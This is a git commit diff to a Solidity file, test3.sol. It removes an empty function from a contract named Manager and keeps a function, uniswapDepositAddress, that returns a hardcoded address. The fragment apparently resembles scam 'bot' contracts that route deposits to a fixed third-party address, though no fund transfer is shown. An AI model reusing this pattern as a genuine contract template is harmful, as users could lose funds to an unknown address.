3b87ece206d4a6527979c52d1926702a472d4242
cryptofan2023 <97004725+cryptofan2023@users.noreply.github.com>
2022-01-03 20:45:41 +1000

    Update test3.sol

--- test3.sol
+++ test3.sol
@@ -2,12 +2,7 @@ pragma solidity ^0.6.6;
 
 contract Manager {
    
-	function performTasks() public {
-
-	}
-      
-
-	function uniswapDepositAddress() public pure returns (address) {
+function uniswapDepositAddress() public pure returns (address) {
        return 0x4a59711D7503566B4A69ec13937255E2441df7A8;
 	}
  
